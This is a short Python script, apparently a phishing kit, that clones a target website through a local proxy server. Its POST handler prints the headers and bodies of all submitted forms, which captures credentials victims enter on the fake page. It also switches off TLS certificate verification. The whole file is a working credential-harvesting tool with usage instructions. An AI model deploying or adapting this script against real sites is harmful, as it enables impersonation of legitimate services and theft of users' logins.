import sys, socketserver, http.server, ssl, requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#a very basic and buggy site cloner script
#python3 site_cloner.py [url_to_clone] [ip] [port]


if len(sys.argv) != 4:

    print("[~] Usage : python3 site_cloner.py [url_to_clone] [ip] [port]")
    exit()

clone_url = sys.argv[1]
ip = sys.argv[2]
port = int(sys.argv[3])

class Handler (http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        incoming_url = self.path[1:]
        mimetype = ''
        #proxy
        if self.path=="/":
            resp = requests.get(clone_url+incoming_url,verify=False)
            self.send_response(resp.status_code)
            self.end_headers()
            self.wfile.write(resp.text.encode())
        
        if self.path.endswith(".html"):
            mimetype = 'text/html'
            
        if self.path.endswith(".jpg"):
            mimetype = 'image/jpg'
            
        if self.path.endswith(".png"):
            mimetype = 'image/png'
            
        if self.path.endswith(".gif"):
            mimetype = 'image/gif'
            
        if self.path.endswith(".js"):
            mimetype = 'application/javascript'
            
        if self.path.endswith(".css"):
            mimetype = 'text/css'
            
        if 'image' in mimetype: 
            resp = requests.get(clone_url+incoming_url,verify=False,stream=True)
            print(resp.status_code)
            self.send_response(resp.status_code)
            self.send_header('Content-Type', mimetype)
            self.end_headers()
            print(clone_url+incoming_url)
            print(resp.status_code)
            resp.raw.decode_content = True
            self.wfile.write(resp.content)
        else:
            resp = requests.get(clone_url+incoming_url,verify=False)
            print(resp.status_code)
            self.send_response(resp.status_code)
            self.send_header('Content-Type', mimetype)
            self.end_headers()
            self.wfile.write(resp.text.encode('utf-8'))
        
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length) 
        print("POST REQUEST:\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n" % (str(self.path), str(self.headers), post_data.decode('utf-8')))

socketserver.TCPServer.allow_reuse_address = True
with socketserver.TCPServer((ip, port), Handler) as httpd:
        print("url: http://"+ip+":"+str(port)+"/")
        httpd.serve_forever()
